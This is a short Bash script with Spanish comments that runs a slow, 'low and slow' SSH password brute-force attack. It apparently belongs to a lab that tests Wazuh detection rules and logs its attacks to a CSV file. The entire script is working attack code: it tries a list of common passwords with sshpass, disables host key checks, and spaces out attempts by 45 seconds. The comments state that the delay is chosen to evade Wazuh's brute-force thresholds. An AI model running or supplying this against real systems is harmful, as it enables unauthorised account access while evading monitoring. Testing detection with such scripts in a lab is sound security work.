#!/usr/bin/env bash
# Ataque 1b (SIGILOSO): Fuerza bruta SSH LENTA / "low and slow" (MITRE T1110.001)
# A diferencia del ataque ruidoso (hydra a maxima velocidad), aqui se prueban
# credenciales UNA a la vez con esperas largas entre intentos, para quedar por
# DEBAJO del umbral temporal de las reglas de fuerza bruta de Wazuh (que
# cuentan N fallos en una ventana corta). Es una tecnica de evasion real.
# Uso: ./attack1b_bruteforce_lento.sh <IP> <USUARIO> [SEG_ENTRE_INTENTOS]
set -uo pipefail
source "$(dirname "$0")/../_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP> <USUARIO> [SEG_ENTRE_INTENTOS]}"
USER="${2:?Falta usuario}"
GAP="${3:-45}"   # 45s entre intentos -> evade la ventana de deteccion por defecto

PASSWORDS=(123456 password admin letmein qwerty Password1 admin123)
INICIO=$(log_inicio)
echo "[+] Fuerza bruta SSH LENTA contra ${TARGET} (${GAP}s entre intentos, evasion de umbral)..."
for p in "${PASSWORDS[@]}"; do
  sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "${USER}@${TARGET}" "exit" &>/dev/null && { echo "  [!] credencial valida: ${p}"; break; } || echo "  intento ${p} fallido"
  sleep "$GAP"
done
log_fin "bruteforce_ssh_lento" "T1110.001" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque sigiloso registrado en log_ataques.csv"
